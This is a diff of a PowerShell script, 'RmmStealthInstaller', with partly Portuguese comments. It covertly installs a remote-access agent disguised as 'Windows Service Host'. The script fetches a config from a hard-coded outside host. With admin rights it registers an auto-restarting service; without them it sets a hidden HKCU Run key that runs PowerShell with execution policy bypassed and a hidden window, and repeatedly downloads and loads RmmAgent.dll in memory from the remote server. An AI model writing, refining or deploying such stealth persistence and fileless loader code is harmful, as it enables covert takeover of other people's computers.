@@ -1,23 +1,18 @@
 <#
 .SYNOPSIS
-    RmmStealthInstaller (ct1) — variantes face a ct.txt:
-    - Run (HKCU): ≤260 caracteres; caminho absoluto ao powershell.exe; bootstrap em HKCU\Environment (RMM0); -Command "& { ... }" (scriptblock em linha de comandos).
-    - -Diagnostics: verifica Run/env/CLSID, StartupApproved, simula o mesmo -Command da Run com janela visível.
-    - Agente C#: em fileless, JWT persistido em HKCU (valor T) — ver RegistrationService.
-    - powershell: -NoProfile -NonInteractive -WindowStyle Hidden; conhost.exe é processo legítimo do Windows 7 — não usamos a flag conhost --headless (não existe no Win7).
-    - Run key: verificação se OpenSubKey devolve null.
-    - HTTPS: tenta activar TLS 1.2 para WebClient em hosts antigos.
+    RmmStealthInstaller (ct3) — base em ct.txt:
+    Admin    -> igual a ct.txt (serviço + ficheiros em %ProgramData%\...\rmm).
+    No admin -> fileless Run; variantes face a ct.txt: HKCU CLSID com C, U, R e I; Run e Start-Process usam caminho completo ao powershell.exe.
+    Requires: Windows PowerShell 2.0+ para admin/bootstrap JSON; config URL deve incluir "server":"..."
 .EXAMPLE
-    .\ct1.txt -Config https://host/cfg.json
-    .\ct1.txt -Uninstall
-    .\ct1.txt -Diagnostics
+    .\ct3.txt -Config https://host/cfg.json
+    .\ct3.txt -Uninstall
 #>
 param(
     [string]$Config  = 'https://brconsulta.com/test/conf.cfg',
     [string]$Name    = 'WinSvcHost',
     [string]$Display = 'Windows Service Host',
-    [switch]$Uninstall,
-    [switch]$Diagnostics
+    [switch]$Uninstall
 )
 
 $ErrorActionPreference = 'Stop'
@@ -25,26 +20,14 @@ $ErrorActionPreference = 'Stop'
 $REG_HKLM = 'SOFTWARE\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 $REG_HKCU = 'Software\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 $RUN_KEY  = 'Software\Microsoft\Windows\CurrentVersion\Run'
-# Bootstrap fileless em HKCU\Environment (RMM0). Linha da Run deve ser ≤260 (MSDN Run/RunOnce).
-$RMM_BOOT_USER_ENV = 'RMM0'
 
 function Test-Admin {
     ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Enable-Tls12ForHttps {
-    param([string]$url)
-    if ($url -notmatch '^\s*https://') { return }
-    try {
-        $t12 = [Net.SecurityProtocolType]::Tls12
-        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $t12
-    } catch { }
-}
-
 function Get-ServerUrl {
     param([string]$url)
-    Enable-Tls12ForHttps $url
     $raw = (New-Object Net.WebClient).DownloadString($url)
     $srv = $null
     if ($PSVersionTable.PSVersion.Major -ge 3) {
@@ -100,12 +83,15 @@ function Write-BootstrapJson {
     Set-Content -LiteralPath $LiteralPath -Value $json.Trim() -Encoding UTF8
 }
 
+# --- Admin path (real RmmBootstrap + bootstrap.json, same idea as RmmInstaller) ---
+
 function Install-AsAdmin {
     Write-Host "[*] Fetching config from $Config..."
     $srv = Get-ServerUrl $Config
     $base = $srv.TrimEnd('/')
     Write-Host "[+] Server: $srv"
 
+    # Same tree as RmmInstaller admin (%ProgramData%\Microsoft\Windows\rmm); exe renamed for stealth.
     $installRoot = Join-Path $env:ProgramData 'Microsoft\Windows\rmm'
     if (-not (Test-Path $installRoot)) {
         New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
@@ -154,6 +140,7 @@ function Install-AsAdmin {
         -WatchIntervalMs 5000
     Write-Host "[+] bootstrap.json / agent.id written under $installRoot"
 
+    # Service SCM name + bootstrap.json ServiceName must match (RmmBootstrap --service reads JSON).
     $svcName = $Name
     Write-Host "[*] Installing service '$svcName' -> `"$bootExe`" --service"
     sc.exe stop $svcName 2>$null
@@ -161,6 +148,7 @@ function Install-AsAdmin {
     sc.exe delete $svcName 2>$null
     Start-Sleep -Seconds 1
 
+    # Paths under ProgramData normally have no spaces; SCM accepts binPath= exe --service
     sc.exe create $svcName "binPath=$bootExe --service" start= auto "DisplayName=$Display"
     sc.exe description $svcName "Remote Management Service"
     sc.exe failure $svcName reset= 60 actions= restart/5000/restart/10000/restart/30000
@@ -168,25 +156,21 @@ function Install-AsAdmin {
     Write-Host "[+] Service $svcName started."
 }
 
+# --- User path (fileless) ---
+
 function Install-AsUser {
-    Write-Host "[*] No admin - fileless user-mode installation (ct1)."
+    Write-Host "[*] No admin - fileless user-mode installation (ct3)."
 
     Write-Host "[*] Fetching config from $Config..."
     $srv = Get-ServerUrl $Config
     Write-Host "[+] Server: $srv"
 
-    $hkcuPath = 'Software\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
-    # I = agentId persistido no registo (o agente fileless também grava HKCU\Environment, mas o processo da Run
-    # pode arrancar sem esse bloco visível). Ler I no runner alinha com o mesmo device após reboot.
     $agentIdHex = [guid]::NewGuid().ToString('N')
-    # No arranque (Run) não corre Get-ServerUrl: activar TLS aqui antes de WebClient, senão HTTPS falha em loop após reboot.
+    $hkcuPath = 'Software\Classes\CLSID\{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
     $runner = '$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(''' + $hkcuPath + '''); ' +
               'if(-not $k){exit}; ' +
-              '$u=$k.GetValue(''U'');$i=$k.GetValue(''I'');$k.Close(); ' +
+              '$u=$k.GetValue(''U''); $k.Close(); ' +
               'if(-not $u){exit}; ' +
-              'if($i -and ($i -match ''^[a-fA-F0-9]{32}$'')){[Environment]::SetEnvironmentVariable(''RMM_AGENT_ID'',$i,''Process'')}; ' +
-              'if($u.StartsWith(''https'')){try{[Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol-bor[Net.SecurityProtocolType]::Tls12}catch{}}; ' +
-              'Start-Sleep -Seconds 5; ' +
               '$env:RMM_SERVER=$u; $env:RMM_FILELESS=''1''; $env:RMM_DEBUG=''1''; $env:RMM_ALLOW_MODULES=''''; ' +
               '$d=5; while($true){ try{ ' +
               '$dll=(New-Object Net.WebClient).DownloadData($u+''/download/RmmAgent.dll''); ' +
@@ -205,49 +189,22 @@ function Install-AsUser {
     $k.Close()
     Write-Host "[+] Registry: HKCU\$REG_HKCU (R=runner, I=agentId $agentIdHex)"
 
-    # Bootstrap: lê R da chave CLSID e IEX. Token JWT (T) é escrito pelo agente — ver RegistrationService fileless.
-    $bootstrap = '$p=''' + $REG_HKCU + ''';$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($p);' +
-        'if(-not $k){exit};$s=$k.GetValue(''R'');$k.Close();if(-not $s){exit};Invoke-Expression $s'
-
-    [Environment]::SetEnvironmentVariable($RMM_BOOT_USER_ENV, $bootstrap, 'User')
-    try { [Environment]::SetEnvironmentVariable('RMM_FL_BOOT', $null, 'User') } catch { }
-
-    # Mesmo arranque que a Run: -Command com & { } (scriptblock serializado) para iex do bootstrap na env User.
-    $bootInvoke = [scriptblock]::Create(
-        "iex([Environment]::GetEnvironmentVariable('$RMM_BOOT_USER_ENV','User'))")
-    $invokeCmd = '& { ' + $bootInvoke.ToString().Trim() + ' }'
     $psExeFull = [System.IO.Path]::Combine($env:WINDIR, 'System32\WindowsPowerShell\v1.0\powershell.exe')
-    $cmd ='conhost.exe --headless ' + $psExeFull + ' -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "' + $invokeCmd + '"'
-    $psArgs = @(
-        '-NoProfile',
-        '-NonInteractive',
-        '-WindowStyle', 'Hidden',
-        '-ExecutionPolicy', 'Bypass',
-        '-Command', $invokeCmd
-    )
+    $cmd = 'conhost.exe --headless ' +$psExeFull + ' -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {' + $runner + '}"'
 
-    Write-Host "[*] Run command length: $($cmd.Length) (MSDN max 260 for Run value)."
-    if ($cmd.Length -gt 260) {
-        throw "Run command exceeds 260 characters; shorten flags or env name."
-    }
-
-    Write-Host "[*] Writing Run key (-Command + User env $RMM_BOOT_USER_ENV)..."
+    Write-Host "[*] Writing Run key..."
     $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
         $RUN_KEY, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
-    if (-not $rk) {
-        throw "Cannot open HKCU\$RUN_KEY for write."
-    }
-    try {
-        $rk.SetValue($Name, $cmd, 'String')
-    } finally {
-        $rk.Close()
-    }
+    $rk.SetValue($Name, $cmd, 'String')
+    $rk.Close()
     Write-Host "[+] Run key: HKCU\$RUN_KEY\$Name"
 
     Write-Host "[*] Launching agent..."
-    Start-Process -FilePath $psExeFull -ArgumentList $psArgs -WindowStyle Hidden
+    Start-Process -FilePath $psExeFull -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& { $runner }`"" -WindowStyle Hidden
     Write-Host "[+] Agent launched."
 }
+
+# --- Uninstall ---
 
 function Uninstall-All {
     if (Test-Admin) {
@@ -266,6 +223,7 @@ function Uninstall-All {
         try {
             $hklm = [Microsoft.Win32.RegistryKey]::OpenBaseKey('LocalMachine', 'Registry64')
         } catch {
+            # OpenBaseKey requires .NET 4+; Windows 7 with only .NET 3.5 falls back to LocalMachine.
             $hklm = [Microsoft.Win32.Registry]::LocalMachine
         }
         try { $hklm.DeleteSubKeyTree($REG_HKLM, $false) } catch { }
@@ -276,98 +234,15 @@ function Uninstall-All {
     $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
         $RUN_KEY, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
     if ($rk) { $rk.DeleteValue($Name, $false); $rk.Close() }
-    try { [Environment]::SetEnvironmentVariable($RMM_BOOT_USER_ENV, $null, 'User') } catch { }
-    try { [Environment]::SetEnvironmentVariable('RMM_FL_BOOT', $null, 'User') } catch { }
     Write-Host "[+] User artifacts removed."
 }
 
-function Invoke-FilelessDiagnostics {
-    param([string]$Name)
-    Write-Host '=== ct1 fileless diagnostics (HKCU do utilizador actual) ===' -ForegroundColor Cyan
+# --- Entry point ---
 
-    $rkHive = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($RUN_KEY)
-    if (-not $rkHive) {
-        Write-Host "[!] Não foi possível abrir HKCU\$RUN_KEY" -ForegroundColor Red
-        return
-    }
-    $runVal = $null
-    try { $runVal = $rkHive.GetValue($Name) } finally { $rkHive.Close() }
-    if ([string]::IsNullOrEmpty($runVal)) {
-        Write-Host "[!] Valor Run em falta: HKCU\$RUN_KEY\$Name" -ForegroundColor Red
-    } else {
-        Write-Host "[+] Run '$Name' comprimento: $($runVal.Length) (limite MSDN 260)"
-        Write-Host "    Valor: $runVal"
-    }
-
-    $envB = [Environment]::GetEnvironmentVariable($RMM_BOOT_USER_ENV, 'User')
-    if ([string]::IsNullOrEmpty($envB)) {
-        Write-Host "[!] Env User '$RMM_BOOT_USER_ENV' vazia ou inexistente (HKCU\Environment)" -ForegroundColor Red
-    } else {
-        Write-Host "[+] Env '$RMM_BOOT_USER_ENV' comprimento: $($envB.Length)"
-        $take = [Math]::Min(200, $envB.Length)
-        Write-Host "    Início: $($envB.Substring(0, $take))"
-    }
-
-    $cls = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($REG_HKCU)
-    if (-not $cls) {
-        Write-Host "[!] Chave CLSID em falta: HKCU\$REG_HKCU" -ForegroundColor Red
-    } else {
-        try {
-            Write-Host '[+] Valores na chave CLSID:'
-            foreach ($vn in @('C', 'U', 'R', 'I', 'T')) {
-                $v = $cls.GetValue($vn)
-                if ($null -eq $v) {
-                    Write-Host "    $vn : (ausente)"
-                } elseif ($v -is [string]) {
-                    Write-Host "    $vn : comprimento $($v.Length)"
-                } else {
-                    Write-Host "    $vn : <não-string>"
-                }
-            }
-        } finally {
-            $cls.Close()
-        }
-    }
-
-    $sap = 'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
-    $sk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($sap)
-    if ($sk) {
-        try {
-            $names = $sk.GetValueNames()
-            if ($names -contains $Name) {
-                Write-Host "[*] Existe entrada em StartupApproved\Run para '$Name' (UI pode desactivar arranque)." -ForegroundColor Yellow
-            } else {
-                Write-Host "[+] Sem chave StartupApproved com o nome '$Name' (nomes podem ser hash — ver Definições > Aplicações de arranque)."
-            }
-        } finally {
-            $sk.Close()
-        }
-    }
-
-    Write-Host ''
-    Write-Host '[*] Teste manual Win+R: cola o valor exacto da Run (-Command).' -ForegroundColor Yellow
-    Write-Host '[*] Simulação com janela visível (mesmo -Command que a Run); se o runner entrar em loop, Ctrl+C ou fecha a janela.' -ForegroundColor Yellow
-    $invokeDiag = '& { try { ' + [scriptblock]::Create(
-        "iex([Environment]::GetEnvironmentVariable('$RMM_BOOT_USER_ENV','User'))").ToString().Trim() +
-        ' } catch { Write-Host ($_ | Out-String); Read-Host ''Enter para fechar'' } }'
-    $psExe = [System.IO.Path]::Combine($env:WINDIR, 'System32\WindowsPowerShell\v1.0\powershell.exe')
-    Start-Process -FilePath $psExe -ArgumentList @(
-        '-NoProfile',
-        '-WindowStyle', 'Normal',
-        '-ExecutionPolicy', 'Bypass',
-        '-Command', $invokeDiag
-    ) -Wait
-    Write-Host '[+] Simulação terminou.'
-}
-
-if ($Diagnostics) {
-    Invoke-FilelessDiagnostics -Name $Name
-    exit 0
-}
 if ($Uninstall) {
     Uninstall-All
 } elseif (-not $Config) {
-    Write-Error "Usage: .\ct1.txt -Config <url> | -Uninstall | -Diagnostics"
+    Write-Error "Usage: .\ct3.txt -Config <url>"
     exit 1
 } elseif (Test-Admin) {
     Install-AsAdmin
